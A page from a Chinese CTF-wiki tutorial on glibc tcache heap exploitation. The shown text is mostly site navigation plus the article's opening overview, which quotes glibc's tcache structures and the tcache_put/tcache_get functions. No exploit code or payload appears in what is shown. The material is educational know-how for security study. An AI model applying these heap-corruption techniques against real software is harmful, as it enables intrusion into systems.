          <li class="md-nav__item">
  <a href="#challenge-1" title="Challenge 1 小结" class="md-nav__link">
    Challenge 1 小结
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#challenge-2-hitcon-2018-pwn-baby_tcache" title="Challenge 2 : HITCON 2018 PWN baby_tcache" class="md-nav__link">
    Challenge 2 : HITCON 2018 PWN baby_tcache
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#_5" title="基本信息" class="md-nav__link">
    基本信息
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_6" title="基本功能" class="md-nav__link">
    基本功能
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_7" title="利用思路" class="md-nav__link">
    利用思路
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_8" title="操作过程" class="md-nav__link">
    操作过程
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#challenge-2" title="Challenge 2 小结" class="md-nav__link">
    Challenge 2 小结
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#challenge-3-2014-hitcon-stkof" title="Challenge 3 : 2014 HITCON stkof" class="md-nav__link">
    Challenge 3 : 2014 HITCON stkof
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#_9" title="基本信息" class="md-nav__link">
    基本信息
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#libc-226-tcache" title="libc 2.26 tcache 利用方法" class="md-nav__link">
    libc 2.26 tcache 利用方法
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#0x06" title="0x06 建议习题：" class="md-nav__link">
    0x06 建议习题：
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
      
      
      
      
        <li class="md-nav__item">
          <a href="#__comments" title="评论" class="md-nav__link md-nav__link--active">
            评论
          </a>
        </li>
      
    </ul>
  
</nav>
    
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../chunk_extend_overlapping/" title="Chunk Extend / Overlapping" class="md-nav__link">
      Chunk Extend / Overlapping
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../house_of_einherjar/" title="House Of Einherjar" class="md-nav__link">
      House Of Einherjar
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../house_of_lore/" title="House of Lore" class="md-nav__link">
      House of Lore
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../house_of_force/" title="House Of Force" class="md-nav__link">
      House Of Force
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../unsorted_bin_attack/" title="Unsorted Bin Attack" class="md-nav__link">
      Unsorted Bin Attack
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../house_of_orange/" title="House of Orange" class="md-nav__link">
      House of Orange
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../house_of_rabbit/" title="House of Rabbit" class="md-nav__link">
      House of Rabbit
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../house_of_roman/" title="House of Roman" class="md-nav__link">
      House of Roman
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-8-2-5" type="checkbox" id="nav-8-2-5">
    
    <label class="md-nav__link" for="nav-8-2-5">
      IO_FILE 利用
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="3">
      <label class="md-nav__title" for="nav-8-2-5">
        IO_FILE 利用
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../io_file/introduction/" title="FILE 文件结构介绍" class="md-nav__link">
      FILE 文件结构介绍
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../io_file/fake-vtable-exploit/" title="伪造 vtable 劫持程序流程" class="md-nav__link">
      伪造 vtable 劫持程序流程
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../io_file/fsop/" title="FSOP" class="md-nav__link">
      FSOP
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../io_file/exploit-in-libc2.24/" title="glibc 2.24 下 IO_FILE 的利用" class="md-nav__link">
      glibc 2.24 下 IO_FILE 的利用
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-8-2-6" type="checkbox" id="nav-8-2-6">
    
    <label class="md-nav__link" for="nav-8-2-6">
      条件竞争
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="3">
      <label class="md-nav__title" for="nav-8-2-6">
        条件竞争
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../race-condition/introduction/" title="条件竞争介绍" class="md-nav__link">
      条件竞争介绍
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../race-condition/problem/" title="例题" class="md-nav__link">
      例题
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-8-2-7" type="checkbox" id="nav-8-2-7">
    
    <label class="md-nav__link" for="nav-8-2-7">
      整数溢出
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="3">
      <label class="md-nav__title" for="nav-8-2-7">
        整数溢出
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../integeroverflow/intof/" title="整数溢出原理介绍" class="md-nav__link">
      整数溢出原理介绍
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-8-2-8" type="checkbox" id="nav-8-2-8">
    
    <label class="md-nav__link" for="nav-8-2-8">
      沙箱逃逸
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="3">
      <label class="md-nav__title" for="nav-8-2-8">
        沙箱逃逸
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../sandbox/python-sandbox-escape/" title="Python沙箱逃逸" class="md-nav__link">
      Python沙箱逃逸
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-8-2-9" type="checkbox" id="nav-8-2-9">
    
    <label class="md-nav__link" for="nav-8-2-9">
      arm-pwn
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="3">
      <label class="md-nav__title" for="nav-8-2-9">
        arm-pwn
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../arm/environment/" title="环境搭建" class="md-nav__link">
      环境搭建
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../arm/arm_rop/" title="arm-rop" class="md-nav__link">
      arm-rop
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-8-2-10" type="checkbox" id="nav-8-2-10">
    
    <label class="md-nav__link" for="nav-8-2-10">
      kernel
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="3">
      <label class="md-nav__title" for="nav-8-2-10">
        kernel
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../kernel/environment/" title="环境搭建" class="md-nav__link">
      环境搭建
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../kernel/basic_knowledge/" title="基础知识" class="md-nav__link">
      基础知识
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../kernel/kernel_uaf/" title="kernel-UAF" class="md-nav__link">
      kernel-UAF
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../kernel/kernel_rop/" title="kernel-ROP" class="md-nav__link">
      kernel-ROP
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../kernel/ret2usr/" title="ret2usr" class="md-nav__link">
      ret2usr
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../kernel/bypass_smep/" title="bypass-smep" class="md-nav__link">
      bypass-smep
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../kernel/double-fetch/" title="Double Fetch" class="md-nav__link">
      Double Fetch
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-8-2-11" type="checkbox" id="nav-8-2-11">
    
    <label class="md-nav__link" for="nav-8-2-11">
      Summary
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="3">
      <label class="md-nav__title" for="nav-8-2-11">
        Summary
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../summary/get-address/" title="获取地址" class="md-nav__link">
      获取地址
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../summary/hijack-control-flow/" title="控制程序执行流" class="md-nav__link">
      控制程序执行流
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../summary/get-shell/" title="get shell" class="md-nav__link">
      get shell
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-8-3" type="checkbox" id="nav-8-3">
    
    <label class="md-nav__link" for="nav-8-3">
      Windows Pwn
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
      <label class="md-nav__title" for="nav-8-3">
        Windows Pwn
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../windows/readme/" title="概述" class="md-nav__link">
      概述
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-8-3-2" type="checkbox" id="nav-8-3-2">
    
    <label class="md-nav__link" for="nav-8-3-2">
      栈溢出
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="3">
      <label class="md-nav__title" for="nav-8-3-2">
        栈溢出
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../windows/stackoverflow/stack-introduce/" title="栈介绍" class="md-nav__link">
      栈介绍
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../windows/stackoverflow/stackoverflow-basic/" title="栈溢出原理" class="md-nav__link">
      栈溢出原理
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../windows/stackoverflow/shellcode-in-stack/" title="shellcode-in-stack" class="md-nav__link">
      shellcode-in-stack
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
      </ul>
    </nav>
  </li>

        
      </ul>
    </nav>
  </li>

    
      
      
      


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-9" type="checkbox" id="nav-9">
    
    <label class="md-nav__link" for="nav-9">
      Android
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
      <label class="md-nav__title" for="nav-9">
        Android
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../android/basic_develop/basic_develop/" title="Android 开发基础" class="md-nav__link">
      Android 开发基础
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-9-2" type="checkbox" id="nav-9-2">
    
    <label class="md-nav__link" for="nav-9-2">
      Android 运行机制简述
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
      <label class="md-nav__title" for="nav-9-2">
        Android 运行机制简述
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../android/basic_operating_mechanism/readme/" title="简述" class="md-nav__link">
      简述
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-9-2-2" type="checkbox" id="nav-9-2-2">
    
    <label class="md-nav__link" for="nav-9-2-2">
      Android 中 Java 层的运行机制
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="3">
      <label class="md-nav__title" for="nav-9-2-2">
        Android 中 Java 层的运行机制
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../android/basic_operating_mechanism/java_layer/readme/" title="简述" class="md-nav__link">
      简述
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../android/basic_operating_mechanism/java_layer/smali/smali/" title="Smali 介绍" class="md-nav__link">
      Smali 介绍
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-9-2-2-3" type="checkbox" id="nav-9-2-2-3">
    
    <label class="md-nav__link" for="nav-9-2-2-3">
      Dex && ODEX
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="4">
      <label class="md-nav__title" for="nav-9-2-2-3">
        Dex && ODEX
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../android/basic_operating_mechanism/java_layer/dex/dex/" title="DEX" class="md-nav__link">
      DEX
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../android/basic_operating_mechanism/java_layer/dex/odex/" title="ODEX" class="md-nav__link">
      ODEX
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-9-2-3" type="checkbox" id="nav-9-2-3">
    
    <label class="md-nav__link" for="nav-9-2-3">
      Android Native 层介绍
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="3">
      <label class="md-nav__title" for="nav-9-2-3">
        Android Native 层介绍
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../android/basic_operating_mechanism/native_layer/so/" title="Android So 介绍" class="md-nav__link">
      Android So 介绍
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-9-3" type="checkbox" id="nav-9-3">
    
    <label class="md-nav__link" for="nav-9-3">
      Android 逆向基本介绍
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
      <label class="md-nav__title" for="nav-9-3">
        Android 逆向基本介绍
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../android/basic_reverse/overview/" title="简述" class="md-nav__link">
      简述
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../android/basic_reverse/android_code_location/" title="Android 关键代码定位" class="md-nav__link">
      Android 关键代码定位
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-9-3-3" type="checkbox" id="nav-9-3-3">
    
    <label class="md-nav__link" for="nav-9-3-3">
      Android 简单静态分析
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="3">
      <label class="md-nav__title" for="nav-9-3-3">
        Android 简单静态分析
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../android/basic_reverse/static/java-example/" title="Android Java 层静态分析" class="md-nav__link">
      Android Java 层静态分析
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../android/basic_reverse/static/so-example/" title="Android Native 层静态分析" class="md-nav__link">
      Android Native 层静态分析
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../android/basic_reverse/static/complex-example/" title="Android 静态分析混合例子" class="md-nav__link">
      Android 静态分析混合例子
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-9-3-4" type="checkbox" id="nav-9-3-4">
    
    <label class="md-nav__link" for="nav-9-3-4">
      Android 简单动态分析
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="3">
      <label class="md-nav__title" for="nav-9-3-4">
        Android 简单动态分析
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../android/basic_reverse/dynamic/dynamic_debug/" title="简述" class="md-nav__link">
      简述
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../android/basic_reverse/dynamic/ida_native_debug/" title="Android 动态调试 So" class="md-nav__link">
      Android 动态调试 So
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
      </ul>
    </nav>
  </li>

        
      </ul>
    </nav>
  </li>

    
      
      
      


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-10" type="checkbox" id="nav-10">
    
    <label class="md-nav__link" for="nav-10">
      ICS
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
      <label class="md-nav__title" for="nav-10">
        ICS
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../ics/ctfs/" title="ICS_CTF 竞赛" class="md-nav__link">
      ICS_CTF 竞赛
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../ics/discover/" title="ICS_CTF 发现" class="md-nav__link">
      ICS_CTF 发现
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../ics/exploit/" title="ICS_CTF 利用" class="md-nav__link">
      ICS_CTF 利用
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../ics/learn/" title="ICS_CTF 学习资源" class="md-nav__link">
      ICS_CTF 学习资源
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

    
  </ul>
</nav>
                  </div>
                </div>
              </div>
            
            
              <div class="md-sidebar md-sidebar--secondary" data-md-component="toc">
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    
<nav class="md-nav md-nav--secondary">
  
  
  
    <label class="md-nav__title" for="__toc">目录</label>
    <ul class="md-nav__list" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#tcache-makes-heap-exploitation-easy-again" title="tcache makes heap exploitation easy again" class="md-nav__link">
    tcache makes heap exploitation easy again
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#0x01-tcache-overview" title="0x01 Tcache overview" class="md-nav__link">
    0x01 Tcache overview
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#0x02-tcache-usage" title="0x02 Tcache Usage" class="md-nav__link">
    0x02 Tcache Usage
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#0x03-pwn-tcache" title="0x03 Pwn Tcache" class="md-nav__link">
    0x03 Pwn Tcache
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#tcache-poisoning" title="tcache poisoning" class="md-nav__link">
    tcache poisoning
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#tcache-dup" title="tcache dup" class="md-nav__link">
    tcache dup
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#tcache-perthread-corruption" title="tcache perthread corruption" class="md-nav__link">
    tcache perthread corruption
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#tcache-house-of-spirit" title="tcache house of spirit" class="md-nav__link">
    tcache house of spirit
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#smallbin-unlink" title="smallbin unlink" class="md-nav__link">
    smallbin unlink
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#libc-leak" title="libc leak" class="md-nav__link">
    libc leak
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#0x04-tcache-check" title="0x04 Tcache Check" class="md-nav__link">
    0x04 Tcache Check
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#0x05-the-pwn-of-ctf" title="0x05 The pwn of CTF" class="md-nav__link">
    0x05 The pwn of CTF
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#challenge-1-lctf2018-pwn-easy_heap" title="Challenge 1 : LCTF2018 PWN easy_heap" class="md-nav__link">
    Challenge 1 : LCTF2018 PWN easy_heap
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#_1" title="基本信息" class="md-nav__link">
    基本信息
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_2" title="基本功能" class="md-nav__link">
    基本功能
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_3" title="利用思路" class="md-nav__link">
    利用思路
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_4" title="操作过程" class="md-nav__link">
    操作过程
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#challenge-1" title="Challenge 1 小结" class="md-nav__link">
    Challenge 1 小结
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#challenge-2-hitcon-2018-pwn-baby_tcache" title="Challenge 2 : HITCON 2018 PWN baby_tcache" class="md-nav__link">
    Challenge 2 : HITCON 2018 PWN baby_tcache
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#_5" title="基本信息" class="md-nav__link">
    基本信息
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_6" title="基本功能" class="md-nav__link">
    基本功能
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_7" title="利用思路" class="md-nav__link">
    利用思路
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_8" title="操作过程" class="md-nav__link">
    操作过程
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#challenge-2" title="Challenge 2 小结" class="md-nav__link">
    Challenge 2 小结
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#challenge-3-2014-hitcon-stkof" title="Challenge 3 : 2014 HITCON stkof" class="md-nav__link">
    Challenge 3 : 2014 HITCON stkof
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#_9" title="基本信息" class="md-nav__link">
    基本信息
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#libc-226-tcache" title="libc 2.26 tcache 利用方法" class="md-nav__link">
    libc 2.26 tcache 利用方法
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#0x06" title="0x06 建议习题：" class="md-nav__link">
    0x06 建议习题：
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
      
      
      
      
        <li class="md-nav__item">
          <a href="#__comments" title="评论" class="md-nav__link md-nav__link--active">
            评论
          </a>
        </li>
      
    </ul>
  
</nav>
                  </div>
                </div>
              </div>
            
          
          <div class="md-content">
            <article class="md-content__inner md-typeset">
              
                
                  <a href="https://github.com/ctf-wiki/ctf-wiki/blob/master/docs/pwn/linux/glibc-heap/tcache_attack.md" title="编辑此页" class="md-icon md-content__icon">&#xE3C9;</a>
                
                
                  <h1>Tcache 利用</h1>
                
                <h2 id="tcache-makes-heap-exploitation-easy-again">tcache makes heap exploitation easy again<a class="headerlink" href="#tcache-makes-heap-exploitation-easy-again" title="Permanent link">&para;</a></h2>
<h3 id="0x01-tcache-overview">0x01 Tcache overview<a class="headerlink" href="#0x01-tcache-overview" title="Permanent link">&para;</a></h3>
<p>在 tcache 中新增了两个结构体，分别是 tcache_entry 和 tcache_pertheread_struct</p>
<div class="codehilite"><pre><span></span><span class="cm">/* We overlay this structure on the user-data portion of a chunk when the chunk is stored in the per-thread cache.  */</span>
<span class="k">typedef</span> <span class="k">struct</span> <span class="n">tcache_entry</span>
<span class="p">{</span>
  <span class="k">struct</span> <span class="n">tcache_entry</span> <span class="o">*</span><span class="n">next</span><span class="p">;</span>
<span class="p">}</span> <span class="n">tcache_entry</span><span class="p">;</span>

<span class="cm">/* There is one of these for each thread, which contains the per-thread cache (hence &quot;tcache_perthread_struct&quot;).  Keeping overall size low is mildly important.  Note that COUNTS and ENTRIES are redundant (we could have just counted the linked list each time), this is for performance reasons.  */</span>
<span class="k">typedef</span> <span class="k">struct</span> <span class="n">tcache_perthread_struct</span>
<span class="p">{</span>
  <span class="kt">char</span> <span class="n">counts</span><span class="p">[</span><span class="n">TCACHE_MAX_BINS</span><span class="p">];</span>
  <span class="n">tcache_entry</span> <span class="o">*</span><span class="n">entries</span><span class="p">[</span><span class="n">TCACHE_MAX_BINS</span><span class="p">];</span>
<span class="p">}</span> <span class="n">tcache_perthread_struct</span><span class="p">;</span>

<span class="k">static</span> <span class="n">__thread</span> <span class="n">tcache_perthread_struct</span> <span class="o">*</span><span class="n">tcache</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
</pre></div>

<p>其中有两个重要的函数， <code>tcache_get()</code> 和 <code>tcache_put()</code>:</p>
<div class="codehilite"><pre><span></span><span class="k">static</span> <span class="kt">void</span>
<span class="nf">tcache_put</span> <span class="p">(</span><span class="n">mchunkptr</span> <span class="n">chunk</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">tc_idx</span><span class="p">)</span>
<span class="p">{</span>
  <span class="n">tcache_entry</span> <span class="o">*</span><span class="n">e</span> <span class="o">=</span> <span class="p">(</span><span class="n">tcache_entry</span> <span class="o">*</span><span class="p">)</span> <span class="n">chunk2mem</span> <span class="p">(</span><span class="n">chunk</span><span class="p">);</span>
  <span class="n">assert</span> <span class="p">(</span><span class="n">tc_idx</span> <span class="o">&lt;</span> <span class="n">TCACHE_MAX_BINS</span><span class="p">);</span>
  <span class="n">e</span><span class="o">-&gt;</span><span class="n">next</span> <span class="o">=</span> <span class="n">tcache</span><span class="o">-&gt;</span><span class="n">entries</span><span class="p">[</span><span class="n">tc_idx</span><span class="p">];</span>
  <span class="n">tcache</span><span class="o">-&gt;</span><span class="n">entries</span><span class="p">[</span><span class="n">tc_idx</span><span class="p">]</span> <span class="o">=</span> <span class="n">e</span><span class="p">;</span>
  <span class="o">++</span><span class="p">(</span><span class="n">tcache</span><span class="o">-&gt;</span><span class="n">counts</span><span class="p">[</span><span class="n">tc_idx</span><span class="p">]);</span>
<span class="p">}</span>

<span class="k">static</span> <span class="kt">void</span> <span class="o">*</span>
<span class="nf">tcache_get</span> <span class="p">(</span><span class="kt">size_t</span> <span class="n">tc_idx</span><span class="p">)</span>
<span class="p">{</span>
  <span class="n">tcache_entry</span> <span class="o">*</span><span class="n">e</span> <span class="o">=</span> <span class="n">tcache</span><span class="o">-&gt;</span><span class="n">entries</span><span class="p">[</span><span class="n">tc_idx</span><span class="p">];</span>
  <span class="n">assert</span> <span class="p">(</span><span class="n">tc_idx</span> <span class="o">&lt;</span> <span class="n">TCACHE_MAX_BINS</span><span class="p">);</span>
  <span class="n">assert</span> <span class="p">(</span><span class="n">tcache</span><span class="o">-&gt;</span><span class="n">entries</span><span class="p">[</span><span class="n">tc_idx</span><span class="p">]</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">);</span>
  <span class="n">tcache</span><span class="o">-&gt;</span><span class="n">entries</span><span class="p">[</span><span class="n">tc_idx</span><span class="p">]</span> <span class="o">=</span> <span class="n">e</span><span class="o">-&gt;</span><span class="n">next</span><span class="p">;</span>
  <span class="o">--</span><span class="p">(</span><span class="n">tcache</span><span class="o">-&gt;</span><span class="n">counts</span><span class="p">[</span><span class="n">tc_idx</span><span class="p">]);</span>
  <span class="k">return</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span> <span class="n">e</span><span class="p">;</span>
<span class="p">}</span>
</pre></div>

<p>这两个函数的会在函数 <a href="https://sourceware.org/git/gitweb.cgi?p=glibc.git;a=blob;f=malloc/malloc.c;h=2527e2504761744df2bdb1abdc02d936ff907ad2;hb=d5c3fafc4307c9b7a4c7d5cb381fcdbfad340bcc#l4173">_int_free</a> 和 <a href="https://sourceware.org/git/gitweb.cgi?p=glibc.git;a=blob;f=malloc/malloc.c;h=2527e2504761744df2bdb1abdc02d936ff907ad2;hb=d5c3fafc4307c9b7a4c7d5cb381fcdbfad340bcc#l3051">__libc_malloc</a> 的开头被调用，其中 <code>tcache_put</code> 当所请求的分配大小不大于<code>0x408</code>并且当给定大小的 tcache bin 未满时调用。一个tcache bin中的最大块数<code>mp_.tcache_count</code>是<code>7</code>。</p>
<div class="codehilite"><pre><span></span><span class="cm">/* This is another arbitrary limit, which tunables can change.  Each</span>
<span class="cm">   tcache bin will hold at most this number of chunks.  */</span>
<span class="cp"># define TCACHE_FILL_COUNT 7</span>
<span class="cp">#endif</span>
